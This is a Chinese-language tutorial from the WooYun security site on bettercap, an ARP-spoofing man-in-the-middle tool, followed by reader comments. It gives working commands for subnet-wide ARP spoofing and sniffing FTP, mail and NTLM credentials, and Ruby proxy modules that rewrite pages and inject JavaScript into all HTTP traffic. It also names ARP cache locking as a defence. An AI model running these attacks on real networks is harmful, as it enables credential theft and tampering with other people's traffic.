<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">中间人攻击利用框架bettercap测试</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2015/07/28 11:28" ui-time="" datetime="2015/07/28 11:28" class="published ng-binding ng-isolate-scope">2015/07/28 11:28</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00前言</h2><hr><p>上篇提到内网渗透很有趣，这次就从一款新工具说起: bettercap</p><h2>0x01简介</h2><hr><p>bettercap可用来实现各种中间人攻击，模块化，便携、易扩展</p><h2>0x02特点</h2><hr><p>提到中间人攻击，最知名的莫过于ettercap，而开发bettercap的目的不是为了追赶它，而是替代它 原因如下：</p><blockquote><p>1、ettercap很成功，但在新时代下它已经老了 2、ettercap的过滤器复杂，使用门槛高 3、在大型网络下，主机发现功能效果很差 4、优化不够，对研究人员来说，无用的功能太多 5、扩展性不够，开发需要掌握C/C++语言</p></blockquote><h2>0x03测试环境搭建</h2><hr><p>kali linux：</p><pre><code>git clone https://github.com/evilsocket/bettercap
cd bettercap
gem build bettercap.gemspec
sudo gem install bettercap*.gem
</code></pre><p>如果报错，如图：</p><p><img alt="这里写图片描述" img-src="c128ff2b13f31bf8b4edef1650b86137c90c090f.jpg"></p><p>执行如下命令：</p><pre><code>sudo apt-get install ruby-dev libpcap-dev
sudo gem install bettercap*.gem   
</code></pre><p>最后成功，如图：</p><p><img alt="这里写图片描述" img-src="0798f7c5d4aed65bc41f261378b718a7c4b234d7.jpg"></p><h2>0x04参数说明</h2><hr><p>已做翻译并加入个人理解</p><p>用法:</p><blockquote><p>-I, --interface IFACE 指定Network interface name，默认eth0</p><p>-S, --spoofer NAME 指定欺骗模块，此参数默认为ARP，目前仅支持ARP，新版本会添加更多选项</p><p>-T, --target ADDRESS 指定单一ip，如果未设置，则代表所有子网，子网所有主机自动扫描，简单高效，十分推荐<br>-O, --log LOG_FILE 日志功能</p><p>-D, --debug 调试功能，会将每一步操作详细记录，便于调试</p><p>-L, --local 解析流经本机的所有数据包（此操作会开启嗅探器），此参数默认为关闭</p><p>-X, --sniffer 开启嗅探器. --sniffer-pcap FILE 将数据包保存为PCAP文件，可用Wireshark打开（此操作会开启嗅探器） --sniffer-filter EXPRESSION 配置嗅探器使用BPF过滤器（此操作会开启嗅探器）</p><p>-P, --parsers PARSERS 指定数据包（此操作会开启嗅探器），支持NTLMSS, IRC, POST, URL, FTP, HTTPS, HTTPAUTH, MAIL，此参数默认为所有 --no-discovery 只使用当前的ARP缓存，不去扫描其他主机，此参数默认为关闭 --no-spoofing 关闭欺骗模块，也可以使用参数--spoofer NONE代替 --proxy 启用HTTP代理并且重定向所有HTTP请求至本机，此参数默认为关闭 --proxy-port PORT 设置HTTP代理端口，此参数默认为8080 --proxy-module MODULE 指定加载的Ruby模块 --httpd 开启HTTP服务器，此参数默认为关闭 --httpd-port PORT 指定HTTP server port, 此参数默认为8081. --httpd-path PATH 指定HTTP server path,此参数默认为 ./.</p><p>-h, --help 英文帮助</p></blockquote><h2>0x05功能测试</h2><hr><h3>1、HOST DISCOVERY + ARP MAN IN THE MIDDLE</h3><pre><code>sudo bettercap -X
</code></pre><p>扫描全部内网主机，傻瓜式操作，自动扫描并进行arp欺骗，使所有流量经过本机，如图 <img alt="这里写图片描述" img-src="f997588db35212162b8434ad56979d82216d8daf.jpg"></p><h3>2、CREDENTIALS SNIFFER</h3><p>抓取流量中有价值的信息，包括：</p><pre><code>URLs being visited.
HTTPS host being visited.
HTTP POSTed data.
HTTP Basic and Digest authentications.
FTP credentials.
IRC credentials.
POP, IMAP and SMTP credentials.
NTLMv1/v2 ( HTTP, SMB, LDAP, etc ) credentials.
</code></pre><p>用法举例：</p><p>默认傻瓜模式，开启所有功能:</p><pre><code>sudo bettercap -X
</code></pre><p>如图为抓到的163邮箱登陆数据</p><p><img alt="这里写图片描述" img-src="ddca0240f0ef8a5b201befb5d85ed50f355587a7.jpg"></p><p>指定抓取的数据包:</p><pre><code>sudo bettercap -X -P "FTP,HTTPAUTH,MAIL,NTLMSS"
</code></pre><p>如图为抓到192.168.40.146的FTP</p><p><img alt="这里写图片描述" img-src="7ba99e8d6eb43d478a00445afb953777c266784b.jpg"></p><h3>3、MODULAR TRANSPARENT PROXY</h3><p>代理功能，可以拦截篡改HTTP流量</p><p>用法举例：</p><p>开启代理功能：</p><pre><code>sudo bettercap --proxy
</code></pre><p>开启代理功能并指定端口：</p><pre><code>sudo bettercap --proxy --proxy-port=8081
</code></pre><p>关闭arp欺骗，只开启代理</p><pre><code>sudo bettercap -S NONE --proxy
</code></pre><p>开启代理功能并加载指定的Ruby模块</p><pre><code>sudo bettercap --proxy --proxy-module=hack_title.rb
</code></pre><p>Ruby参考示例：</p><pre><code>class HackTitle &lt; Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type == 'text/html'
      Logger.info "Hacking http://#{request.host}#{request.url} title tag"
      # make sure to use sub! or gsub! to update the instance
      response.body.sub!( '&lt;title&gt;', '&lt;title&gt; !!! HACKED !!! ' )
    end
  end
end
</code></pre><p>功能为替换所有html的标题选项</p><h3>4、BUILTIN HTTP SERVER</h3><p>内置HTTP SERVER功能，可篡改HTTP响应包内容</p><p>用法举例：</p><p>在网络的每一个HTTP响应中注入JS文件</p><pre><code>sudo bettercap --httpd --http-path=/path/to/your/js/file/ --proxy --proxy-module=inject.rb
</code></pre><p>Ruby参考示例：</p><pre><code>class InjectJS &lt; Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type == 'text/html'
      Logger.info "Injecting javascript file into http://#{request.host}#{request.url} page"
      # get the local interface address and HTTPD port
      localaddr = Context.get.iface[:ip_saddr]
      localport = Context.get.options[:httpd_port]
      # inject the js
      response.body.sub!( '&lt;/title&gt;', "&lt;/title&gt;&lt;script src='http://#{localaddr}:#{localport}/file.js' 

type='text/javascript'&gt;&lt;/script&gt;" )
    end
  end
end
</code></pre><h2>0x06测试心得</h2><hr><p>亮点：</p><blockquote><p>中间人攻击利用框架的开发，便携，安装简单 整合了各种常用功能，功能模块化，自动欺骗攻击，提高效率 极大降低了工具的使用和开发门槛</p></blockquote><h3>不足：</h3><pre><code>目前只支持arp欺骗，功能仍需完善。
暂不支持windows
</code></pre><h2>0x07总结</h2><hr><p>之前我用过c++开发arp欺骗&amp;中间人攻击的程序,个人认为arp欺骗的成功与否关键在于ARP缓存表的修改，<strong>锁定ARP缓存表目前就能防御bettercap基于arp的中间人攻击</strong> 但我相信，bettercap的前景十分广阔。</p><h2>0x08补充</h2><hr><p>bettercap下载地址：</p><p>http://www.bettercap.org/</p><p>水平有限，欢迎补充。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/737" rel="bookmark" id="re1">Tomcat的8009端口AJP的利用</a></li><li><a href="http://drops.wooyun.org/tools/515" rel="bookmark" id="re2">Zmap详细用户手册和DDOS的可行性</a></li><li><a href="http://drops.wooyun.org/tips/6089" rel="bookmark" id="re3">一起写一个 Web 服务器</a></li><li><a href="http://drops.wooyun.org/tips/8638" rel="bookmark" id="re4">通过.PAC进行网络钓鱼</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dmzlabs</span> <span class="reply-time">2016-03-23 00:34:15</span></div><p></p><p>14 git clone https://github.com/evilsocket/bettercap<br>15 cd bettercap<br>16 gem build bettercap.gemspec<br>17 sudo gem install bettercap*.gem<br>18 sudo apt-get install ruby-dev libpcap-dev<br>19 sudo gem install bettercap*.gem<br>20 gem sources --add https://ruby.taobao.org/ --remove https://rubygems.org<br>21 gem sources -l<br>22 gem sources --add https://ruby.taobao.org/ --remove https://rubygems.org<br>23 gem sources -l<br>24 gem sources --remove https://rubygems.org<br>25 sudo gem install bettercap*.gem<br>26 bettercap<br>粘贴一下我的安装命令吧 嘻嘻</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">武器大师</span> <span class="reply-time">2016-03-07 22:54:01</span></div><p></p><p>@三好学生 确实无法获取get的cookie，其实get里面还是会有很多有价值的cookie的</p><p>@izy 不知道有没有找到解决办法</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">joe</span> <span class="reply-time">2016-01-11 10:11:11</span></div><p></p><p>请问下在centos上有安装嘛？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-08-06 10:32:45</span></div><p></p><p>@cnb 建议你看一下 to do list ；深入研究一下arp，你会有更多收获；）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cnb</span> <span class="reply-time">2015-08-06 09:16:42</span></div><p></p><p>arp欺骗有啥前景？防御简单，攻击被发现的概率太大了吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-08-05 10:11:04</span></div><p></p><p>@serber -T 指定目标ip</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">第四维度</span> <span class="reply-time">2015-07-30 17:15:29</span></div><p></p><p>这个工具牛逼，我认为可以替代ettercap。<br>mark！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-07-29 09:48:34</span></div><p></p><p>@izy 可以用-D, --debug 调试功能配合修改</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">izy</span> <span class="reply-time">2015-07-29 08:53:53</span></div><p></p><p>可这是实际测试中，只显示了HTTP post包，get包只显示了去向，官方文档也没这方面的说明，我去看看源码看能不能让它同时显示出来吧。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-07-29 07:52:45</span></div><p></p><p>@izy 从理论上将，根据OSI参考模型，基于arp的中间人攻击，上层所有的http数据都可以获取到，所以http get的cookie如果有，就会被获取，具体到bettercap来说，sudo bettercap -X就可以，傻瓜式操作，自动扫描并进行arp欺骗，使所有流量经过本机，解析并显示。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">izy</span> <span class="reply-time">2015-07-29 00:03:53</span></div><p></p><p>http get的cookie怎么显示出来？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">独奏大表哥</span> <span class="reply-time">2015-07-28 17:52:52</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">2mi</span> <span class="reply-time">2015-07-28 13:05:08</span></div><p></p><p>看完fb的文章 ，就看到了这个。。前排顶一下。。</p><p></p></div></div></div></div></div></main>